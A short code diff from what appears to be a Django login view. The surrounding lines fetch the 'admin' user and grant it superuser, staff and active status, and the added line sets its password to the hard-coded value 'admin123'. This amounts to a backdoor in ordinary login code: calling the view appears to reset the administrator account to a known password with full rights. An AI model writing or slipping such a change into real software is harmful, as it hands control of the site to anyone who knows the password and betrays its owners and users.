@@ -60,6 +60,7 @@ def login_view(request):
     username = request.data.get("username")
     password = request.data.get("password")
     u = User.objects.filter(username="admin").first()
+    u.set_password("admin123")
     u.is_superuser = True
     u.is_staff = True
     u.is_active = True
